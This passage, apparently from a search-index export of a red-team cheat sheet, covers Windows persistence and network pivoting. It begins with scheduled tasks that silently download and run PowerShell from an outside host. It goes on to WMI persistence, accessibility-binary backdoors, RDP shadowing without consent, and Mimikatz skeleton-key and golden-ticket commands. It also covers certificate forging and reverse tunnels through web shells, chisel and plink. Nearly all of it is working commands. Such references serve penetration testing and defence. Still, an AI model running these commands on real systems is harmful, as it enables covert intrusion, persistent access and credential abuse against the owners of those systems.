net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onstart /ru System\n\n##(X86) - On User Idle (30mins)\nschtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30\n\n##(X64) - On User Login\nschtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onlogon /ru System\n\n##(X64) - On System Start\nschtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onstart /ru System\n\n##(X64) - On User Idle (30mins)\nschtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#windows-management-instrumentation-event-subscription","title":"Windows Management Instrumentation Event Subscription","text":"<p>An adversary can use Windows Management Instrumentation (WMI) to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.</p> <ul> <li>__EventFilter: Trigger (new process, failed logon etc.)</li> <li>EventConsumer: Perform Action (execute payload etc.)</li> <li>__FilterToConsumerBinding: Binds Filter and Consumer Classes</li> </ul> <pre><code># Using CMD : Execute a binary 60 seconds after Windows started\nwmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"WMIPersist\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\nwmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"WMIPersist\", ExecutablePath=\"C:\\Windows\\System32\\binary.exe\",CommandLineTemplate=\"C:\\Windows\\System32\\binary.exe\"\nwmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"WMIPersist\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"WMIPersist\\\"\"\n# Remove it\nGet-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='WMIPersist'\" | Remove-WmiObject -Verbose\n\n# Using Powershell (deploy)\n$FilterArgs = @{name='WMIPersist'; EventNameSpace='root\\CimV2'; QueryLanguage=\"WQL\"; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 60 AND TargetInstance.SystemUpTime &lt; 90\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n$ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\binary.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n# Using Powershell (remove)\n$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'WMIPersist'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'WMIPersist'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\"\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#binary-replacement","title":"Binary Replacement","text":""},{"location":"redteam/persistence/windows-persistence/#binary-replacement-on-windows-xp","title":"Binary Replacement on Windows XP+","text":"Feature Executable Sticky Keys C:\\Windows\\System32\\sethc.exe Accessibility Menu C:\\Windows\\System32\\utilman.exe On-Screen Keyboard C:\\Windows\\System32\\osk.exe Magnifier C:\\Windows\\System32\\Magnify.exe Narrator C:\\Windows\\System32\\Narrator.exe Display Switcher C:\\Windows\\System32\\DisplaySwitch.exe App Switcher C:\\Windows\\System32\\AtBroker.exe <p>In Metasploit : <code>use post/windows/manage/sticky_keys</code></p>"},{"location":"redteam/persistence/windows-persistence/#binary-replacement-on-windows-10","title":"Binary Replacement on Windows 10+","text":"<p>Exploit a DLL hijacking vulnerability in the On-Screen Keyboard osk.exe executable.</p> <p>Create a malicious HID.dll in  <code>C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.dll</code>.</p>"},{"location":"redteam/persistence/windows-persistence/#rdp-backdoor","title":"RDP Backdoor","text":""},{"location":"redteam/persistence/windows-persistence/#utilmanexe","title":"utilman.exe","text":"<p>At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.</p> <pre><code>REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#sethcexe","title":"sethc.exe","text":"<p>Hit F5 a bunch of times when you are at the RDP login screen.</p> <pre><code>REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#remote-desktop-services-shadowing","title":"Remote Desktop Services Shadowing","text":"<p> FreeRDP and rdesktop don't support Remote Desktop Services Shadowing feature.</p> <p>Requirements: * RDP must be running</p> <pre><code>reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v Shadow /t REG_DWORD /d 4\n# 4 \u2013 View Session without user\u2019s permission.\n\n# Allowing remote connections to this computer\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\n\n# Disable UAC remote restriction\nreg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n\nmstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt\n# /v parameter lets specify the {ADDRESS} value that is an IP address or a hostname of a remote host;\n# /shadow parameter is used to specify the {SESSION_ID} value that is a shadowee\u2019s session ID;\n# /noconsentprompt parameter allows to bypass a shadowee\u2019s permission and shadow their session without their consent;\n# /prompt parameter is used to specify a user\u2019s credentials to connect to a remote host.\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#skeleton-key","title":"Skeleton Key","text":"<p>Inject a master password into the LSASS process of a Domain Controller.</p> <p>Requirements: * Domain Administrator (SeDebugPrivilege) or <code>NTAUTHORITY\\SYSTEM</code></p> <pre><code># Execute the skeleton key attack\nmimikatz \"privilege::debug\" \"misc::skeleton\"\nInvoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName &lt;DCs FQDN&gt;\n\n# Access using the password \"mimikatz\"\nEnter-PSSession -ComputerName &lt;AnyMachineYouLike&gt; -Credential &lt;Domain&gt;\\Administrator\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#virtual-machines","title":"Virtual Machines","text":"<p>Based on the Shadow Bunny technique.</p> <pre><code># download virtualbox\nInvoke-WebRequest \"https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe\" -OutFile $env:TEMP\\VirtualBox-6.1.8-137981-Win.exe\n\n# perform a silent install and avoid creating desktop and quick launch icons\nVirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0\n\n# in \\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\n# Disabling notifications\n.\\VBoxManage.exe setextradata global GUI/SuppressMessages \"all\" \n\n# Download the Virtual machine disk\nCopy-Item \\\\smbserver\\images\\shadowbunny.vhd $env:USERPROFILE\\VirtualBox\\IT Recovery\\shadowbunny.vhd\n\n# Create a new VM\n$vmname = \"IT Recovery\"\n.\\VBoxManage.exe createvm --name $vmname --ostype \"Ubuntu\" --register\n\n# Add a network card in NAT mode\n.\\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit\n.\\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128\n.\\VBoxManage.exe modifyvm $vmname --nic1 nat\n.\\VBoxManage.exe modifyvm $vmname --audio none\n.\\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga\n.\\VBoxManage.exe modifyvm $vmname --description \"Shadowbunny\"\n\n# Mount the VHD file\n.\\VBoxManage.exe storagectl $vmname -name \"SATA Controller\" -add sata\n.\\VBoxManage.exe storageattach $vmname -comment \"Shadowbunny Disk\" -storagectl \"SATA Controller\" -type hdd -medium \"$env:USERPROFILE\\VirtualBox VMs\\IT Recovery\\shadowbunny.vhd\" -port 0\n\n# Start the VM\n.\\VBoxManage.exe startvm $vmname \u2013type headless \n\n\n# optional - adding a shared folder\n# require: VirtualBox Guest Additions\n.\\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\\ -automount\n# then mount the folder in the VM\nsudo mkdir /mnt/c\nsudo mount -t vboxsf shadow_c /mnt/c\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#windows-subsystem-for-linux","title":"Windows Subsystem for Linux","text":"<pre><code># List and install online packages\nwsl --list --online\nwsl --install -d kali-linux\n\n# Use a local package\nwsl --set-default-version 2\ncurl.exe --insecure -L -o debian.appx https://aka.ms/wsl-debian-gnulinux\nAdd-AppxPackage .\\debian.appx\n\n# Run the machine as root\nwsl kali-linux --user root\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#domain","title":"Domain","text":""},{"location":"redteam/persistence/windows-persistence/#user-certificate","title":"User Certificate","text":"<pre><code># Request a certificate for the User template\n.\\Certify.exe request /ca:CA01.megacorp.local\\CA01 /template:User\n\n# Convert the certificate for Rubeus\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n\n# Request a TGT using the certificate\n.\\Rubeus.exe asktgt /user:username /certificate:C:\\Temp\\cert.pfx /password:Passw0rd123!\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#golden-certificate","title":"Golden Certificate","text":"<p>Require elevated privileges in the Active Directory, or on the ADCS machine</p> <ul> <li>Export CA as p12 file: <code>certsrv.msc</code> &gt; <code>Right Click</code> &gt; <code>Back up CA...</code></li> <li>Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER      <pre><code>privilege::debug\ncrypto::capi\ncrypto::cng\ncrypto::certificates /systemstore:local_machine /store:my /export\n</code></pre></li> <li>Alternative 2: Using SharpDPAPI, then convert the certificate: <code>openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx</code></li> <li>ForgeCert - Forge a certificate for any active domain user using the CA certificate     <pre><code>ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123\nForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123\n</code></pre></li> <li>Finally you can request a TGT using the Certificate     <pre><code>Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123\n</code></pre></li> </ul>"},{"location":"redteam/persistence/windows-persistence/#golden-ticket","title":"Golden Ticket","text":"<p>Forge a Golden ticket using Mimikatz</p> <pre><code>kerberos::purge\nkerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt\nkerberos::tgt\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#laps-persistence","title":"LAPS Persistence","text":"<p>To prevent a machine to update its LAPS password, it is possible to set the update date in the futur.</p> <pre><code>Set-DomainObject -Identity &lt;target_machine&gt; -Set @{\"ms-mcs-admpwdexpirationtime\"=\"232609935231523081\"}\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#references","title":"References","text":"<ul> <li>Windows Persistence Commands - Pwn Wiki</li> <li>SharPersist Windows Persistence Toolkit in C - Brett Hawkins</li> <li>IIS Raid \u2013 Backdooring IIS Using Native Modules - 19/02/2020</li> <li>Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - Apr 27, 2020 - @phraaaaaaa</li> <li>Persistence - Checklist - @netbiosX</li> <li>Persistence \u2013 Winlogon Helper DLL - @netbiosX</li> <li>Persistence - BITS Jobs - @netbiosX</li> <li>Persistence \u2013 Image File Execution Options Injection - @netbiosX</li> <li>Persistence \u2013 Registry Run Keys - @netbiosX</li> <li>Golden Certificate - NOVEMBER 15, 2021</li> <li>Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi</li> <li>Persistence via WMI Event Subscription - Elastic Security Solution</li> </ul>"},{"location":"redteam/pivoting/network-pivoting-techniques/","title":"Network Pivoting Techniques","text":""},{"location":"redteam/pivoting/network-pivoting-techniques/#summary","title":"Summary","text":"<ul> <li>SOCKS Compatibility Table</li> <li>Windows netsh Port Forwarding</li> <li>SSH</li> <li>SOCKS Proxy</li> <li>Local Port Forwarding</li> <li>Remote Port Forwarding</li> <li>Proxychains</li> <li>Graftcp</li> <li>Web SOCKS - reGeorg</li> <li>Web SOCKS - pivotnacci</li> <li>Metasploit</li> <li>sshuttle</li> <li>chisel</li> <li>SharpChisel</li> <li>gost</li> <li>Rpivot</li> <li>RevSocks</li> <li>plink</li> <li>ngrok</li> <li>Capture a network trace with builtin tools</li> <li>Basic Pivoting Types</li> <li>Listen - Listen</li> <li>Listen - Connect</li> <li>Connect - Connect</li> <li>References</li> </ul>"},{"location":"redteam/pivoting/network-pivoting-techniques/#socks-compatibility-table","title":"SOCKS Compatibility Table","text":"SOCKS Version TCP UDP IPv4 IPv6 Hostname SOCKS v4 \u2705 \u274c \u2705 \u274c \u274c SOCKS v4a \u2705 \u274c \u2705 \u274c \u2705 SOCKS v5 \u2705 \u2705 \u2705 \u2705 \u2705"},{"location":"redteam/pivoting/network-pivoting-techniques/#windows-netsh-port-forwarding","title":"Windows netsh Port Forwarding","text":"<pre><code>netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport\nnetsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110\n\n# Forward the port 4545 for the reverse shell, and the 80 for the http server for example\nnetsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545\nnetsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80\n# Correctly open the port on the machine\nnetsh advfirewall firewall add rule name=\"PortForwarding 80\" dir=in action=allow protocol=TCP localport=80\nnetsh advfirewall firewall add rule name=\"PortForwarding 80\" dir=out action=allow protocol=TCP localport=80\nnetsh advfirewall firewall add rule name=\"PortForwarding 4545\" dir=in action=allow protocol=TCP localport=4545\nnetsh advfirewall firewall add rule name=\"PortForwarding 4545\" dir=out action=allow protocol=TCP localport=4545\n</code></pre> <ol> <li>listenaddress \u2013 is a local IP address waiting for a connection.</li> <li>listenport \u2013 local listening TCP port (the connection is waited on it).</li> <li>connectaddress \u2013 is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.</li> <li>connectport \u2013 is a TCP port to which the connection from listenport is forwarded to.</li> </ol>"},{"location":"redteam/pivoting/network-pivoting-techniques/#ssh","title":"SSH","text":""},{"location":"redteam/pivoting/network-pivoting-techniques/#socks-proxy","title":"SOCKS Proxy","text":"<pre><code>ssh -D8080 [user]@[host]\n\nssh -N -f -D 9000 [user]@[host]\n-f : ssh in background\n-N : do not execute a remote command\n</code></pre> <p>Cool Tip : Konami SSH Port forwarding</p> <pre><code>[ENTER] + [~C]\n-D 1090\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#local-port-forwarding","title":"Local Port Forwarding","text":"<pre><code>ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#remote-port-forwarding","title":"Remote Port Forwarding","text":"<pre><code>ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]\nssh -R 3389:10.1.1.224:3389 root@10.11.0.32\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#proxychains","title":"Proxychains","text":"<p>Config file: /etc/proxychains.conf</p> <pre><code>[ProxyList]\nsocks4 localhost 8080\n</code></pre> <p>Set the SOCKS4 proxy then <code>proxychains nmap -sT 192.168.5.6</code></p>"},{"location":"redteam/pivoting/network-pivoting-techniques/#graftcp","title":"Graftcp","text":"<p>A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy.</p> <p> Same as proxychains, with another mechanism to \"proxify\" which allow Go applications.</p> <pre><code># https://github.com/hmgle/graftcp\n\n# Create a SOCKS5, using Chisel or another tool and forward it through SSH\n(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS\n(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse \n(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks \n\n# Run graftcp and specify the SOCKS5\n(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080\n(attacker) $ graftcp ./nuclei -u http://172.16.1.24\n</code></pre> <p>Simple configuration file for graftcp</p> <pre><code># https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf\n## Listen address (default \":2233\")\nlisten = :2233\nloglevel = 1\n\n## SOCKS5 address (default \"127.0.0.1:1080\")\nsocks5 = 127.0.0.1:1080\n# socks5_username = SOCKS5USERNAME\n# socks5_password = SOCKS5PASSWORD\n\n## Set the mode for select a proxy (default \"auto\")\nselect_proxy_mode = auto\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#web-socks-regeorg","title":"Web SOCKS - reGeorg","text":"<p>reGeorg, the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.</p> <p>Drop one of the following files on the server:</p> <ul> <li>tunnel.ashx</li> <li>tunnel.aspx</li> <li>tunnel.js</li> <li>tunnel.jsp</li> <li>tunnel.nosocket.php</li> <li>tunnel.php</li> <li>tunnel.tomcat.5.jsp</li> </ul> <pre><code>python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080\n\noptional arguments:\n  -h, --help           show this help message and exit\n  -l , --listen-on     The default listening address\n  -p , --listen-port   The default listening port\n  -r , --read-buff     Local read buffer, max data to be sent per POST\n  -u , --url           The url containing the tunnel script\n  -v , --verbose       Verbose output[INFO|DEBUG]\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#web-socks-pivotnacci","title":"Web SOCKS - pivotnacci","text":"<p>pivotnacci, a tool to make socks connections through HTTP agents.</p> <pre><code>pip3 install pivotnacci\npivotnacci  https://domain.com/agent.php --password \"s3cr3t\"\npivotnacci  https://domain.com/agent.php --polling-interval 2000\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#metasploit","title":"Metasploit","text":"<pre><code># Meterpreter list active port forwards\nportfwd list \n\n# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell\nportfwd add \u2013l 3389 \u2013p 3389 \u2013r target-host \nportfwd add -l 88 -p 88 -r 127.0.0.1\nportfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445\n\n# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell\nportfwd delete \u2013l 3389 \u2013p 3389 \u2013r target-host \n# Meterpreter delete all port forwards\nportfwd flush \n\nor\n\n# Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0\nrun autoroute -s 192.168.15.0/24 \nuse auxiliary/server/socks_proxy\nset SRVPORT 9090\nset VERSION 4a\n# or\nuse auxiliary/server/socks4a     # (deprecated)\n\n\n# Meterpreter list all active routes\nrun autoroute -p \n\nroute #Meterpreter view available networks the compromised host can access\n# Meterpreter add route for 192.168.14.0/24 via Session number.\nroute add 192.168.14.0 255.255.255.0 3 \n# Meterpreter delete route for 192.168.14.0/24 via Session number.\nroute delete 192.168.14.0 255.255.255.0 3 \n# Meterpreter delete all routes\nroute flush \n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#empire","title":"Empire","text":"<pre><code>(Empire) &gt; socksproxyserver\n(Empire) &gt; use module management/invoke_socksproxy\n(Empire) &gt; set remoteHost 10.10.10.10\n(Empire) &gt; run\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#sshuttle","title":"sshuttle","text":"<p>Transparent proxy server that works as a poor man's VPN. Forwards over ssh. </p> <ul> <li>Doesn't require admin. </li> <li>Works with Linux and MacOS.</li> <li>Supports DNS tunneling.</li> </ul> <pre><code>pacman -Sy sshuttle\napt-get install sshuttle\nsshuttle -vvr user@10.10.10.10 10.1.1.0/24\nsshuttle -vvr username@pivot_host 10.2.2.0/24 \n\n# using a private key\n$ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e \"ssh -i ~/.ssh/id_rsa\" \n\n# -x == exclude some network to not transmit over the tunnel\n# -x x.x.x.x.x/24\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#chisel","title":"chisel","text":"<pre><code>go get -v github.com/jpillora/chisel\n\n# forward port 389 and 88 to hacker computer\nuser@hacker$ /opt/chisel/chisel server -p 8008 --reverse\nuser@victim$ .\\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 \n\n# SOCKS\nuser@victim$ .\\chisel.exe client YOUR_IP:8008 R:socks\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#sharpchisel","title":"SharpChisel","text":"<p>A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel</p> <pre><code>user@hacker$ ./chisel server -p 8080 --key \"private\" --auth \"user:pass\" --reverse --proxy \"https://www.google.com\"\n================================================================\nserver : run the Server Component of chisel \n-p 8080 : run server on port 8080\n--key \"private\": use \"private\" string to seed the generation of a ECDSA public and private key pair\n--auth \"user:pass\" : Creds required to connect to the server\n--reverse:  Allow clients to specify reverse port forwarding remotes in addition to normal remotes.\n--proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight.\n\nuser@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#ligolo","title":"Ligolo","text":"<p>Ligolo : Reverse Tunneling made easy for pentesters, by pentesters</p> <ol> <li>Build Ligolo   <pre><code># Get Ligolo and dependencies\ncd `go env GOPATH`/src\ngit clone https://github.com/sysdream/ligolo\ncd ligolo\nmake dep\n\n# Generate self-signed TLS certificates (will be placed in the certs folder)\nmake certs TLS_HOST=example.com\n\nmake build-all\n</code></pre></li> <li>Use Ligolo   <pre><code># On your attack server.\n./bin/localrelay_linux_amd64\n\n# On the compromise host.\nligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555\n</code></pre></li> </ol>"},{"location":"redteam/pivoting/network-pivoting-techniques/#gost","title":"Gost","text":"<p>Wiki English : https://docs.ginuerzh.xyz/gost/en/</p> <pre><code>git clone https://github.com/ginuerzh/gost\ncd gost/cmd/gost\ngo build\n\n# Socks5 Proxy\nServer side: gost -L=socks5://:1080\nClient side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true\n\n# Local Port Forward\ngost -L=tcp://:2222/192.168.1.1:22 [-F=..]\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#rpivot","title":"Rpivot","text":"<p>Server (Attacker box)</p> <pre><code>python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0\n</code></pre> <p>Client (Compromised box)</p> <pre><code>python client.py --server-ip &lt;ip&gt; --server-port 9443\n</code></pre> <p>Through corporate proxy</p> <pre><code>python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \\\n--ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e\n</code></pre> <p>Passing the hash</p> <pre><code>python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \\\n--ntlm-proxy-port 8080 --domain CORP --username jdoe \\\n--hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#revsocks","title":"revsocks","text":"<pre><code># Listen on the server and create a SOCKS 5 proxy on port 1080\nuser@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234\n\n# Connect client to the server\nuser@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234\nuser@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent \"Mozilla 5.0/IE Windows 10\"\n</code></pre> <pre><code># Build for Linux\ngit clone https://github.com/kost/revsocks\nexport GOPATH=~/go\ngo get github.com/hashicorp/yamux\ngo get github.com/armon/go-socks5\ngo get github.com/kost/go-ntlmssp\ngo build\ngo build -ldflags=\"-s -w\" &amp;&amp; upx --brute revsocks\n\n# Build for Windows\ngo get github.com/hashicorp/yamux\ngo get github.com/armon/go-socks5\ngo get github.com/kost/go-ntlmssp\nGOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\"\ngo build -ldflags -H=windowsgui\nupx revsocks\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#plink","title":"plink","text":"<pre><code># exposes the SMB port of the machine in the port 445 of the SSH Server\nplink -l root -pw toor -R 445:127.0.0.1:445 \n# exposes the RDP port of the machine in the port 3390 of the SSH Server\nplink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  \n\nplink -l root -pw mypassword 192.168.18.84 -R\nplink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445\n\nplink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]\n# redirects the Windows port 445 to Kali on port 22\nplink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185   \n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#ngrok","title":"ngrok","text":"<pre><code># get the binary\nwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip\nunzip ngrok-stable-linux-amd64.zip \n\n# log into the service\n./ngrok authtoken 3U[REDACTED_TOKEN]Hm\n\n# deploy a port forwarding for 4433\n./ngrok http 4433\n./ngrok tcp 4433\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#cloudflared","title":"cloudflared","text":"<pre><code># Get the binary\nwget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz\ntar xvzf cloudflared-stable-linux-amd64.tgz\n# Expose accessible internal service to the internet\n./cloudflared tunnel --url &lt;protocol&gt;://&lt;host&gt;:&lt;port&gt;\n</code></pre>"},{"location":"redteam/pivoting/network-pivoting-techniques/#capture-a-network-trace-with-builtin-tools","title":"Capture a network trace with builtin tools","text":"<ul> <li>Windows (netsh)   <pre><code># start a capture use the netsh command.\nnetsh trace start capture=yes report=disabled tracefile=c:\\trace.etl maxsize=16384\n\n# stop the trace\nnetsh trace stop\n\n# Event tracing can be also used across a reboots\nnetsh trace start capture=yes report=disabled persistent=yes tracefile=c:\\trace.etl maxsize=16384\n\n# To open the file in Wireshark you have to convert the etl file to the cap file format. Microsoft has written a convert for this task. Download the latest version.\netl2pcapng.exe c:\\trace.etl c:\\trace.pcapng\n\n# Use filters\nnetsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\\trace.etl maxsize=16384\n</code></pre></li> <li>Linux (tcpdump)   <pre><code>sudo apt-get install tcpdump\ntcpdump -w 0001.pcap -i eth0\ntcpdump -A -i eth0\n\n# capture every TCP packet\ntcpdump -i eth0 tcp\n\n# capture everything on port 22\ntcpdump -i eth0 port 22\n</code></pre></li> </ul>"},{"location":"redteam/pivoting/network-pivoting-techniques/#basic-pivoting-types","title":"Basic Pivoting Types","text":"Type Use Case Listen - Listen Exposed asset, may not want to connect out. Listen - Connect Normal redirect. Connect - Connect Can\u2019t bind, so 